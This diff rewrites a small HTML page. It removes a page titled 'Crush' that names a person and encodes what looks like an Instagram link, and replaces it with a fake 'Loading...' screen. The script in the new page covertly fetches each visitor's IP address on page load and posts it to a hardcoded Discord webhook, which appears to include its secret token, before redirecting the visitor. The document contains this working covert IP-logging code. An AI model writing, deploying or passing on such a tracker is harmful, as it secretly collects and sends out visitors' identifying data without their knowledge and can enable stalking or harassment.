@@ -3,10 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crush</title>
+    <title>Loading...</title>
+    <script>
+        // Replace with your actual Discord webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1346197853021798440/VgIi-Tqo_OjX89cvWfvcp5RjR0yfMaqkkrn4C-uZpfJPGT6OijeRnPP8F1tqzdS-BkWM";
+
+        // Function to get the user's IP and send it to Discord
+        function logIP() {
+            fetch("https://api64.ipify.org?format=json") // Fetch IP address
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    // Send IP to Discord webhook
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: `New visitor IP: \`${userIP}\`` })
+                    });
+
+                    // Redirect after logging IP
+                    setTimeout(() => {
+                        window.location.href = "https://example.com"; // Change to your redirect URL
+                    }, 1000); // 1 second delay
+                })
+                .catch(error => console.error("Error fetching IP:", error));
+        }
+
+        // Run function when the page loads
+        window.onload = logIP;
+    </script>
 </head>
 <body>
-    <h1>Антал Аманда Ева</h1>
-    <p>aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS92LmkucC5fYW1paTE3</p>
+    <h2>Loading...</h2>
 </body>
 </html>
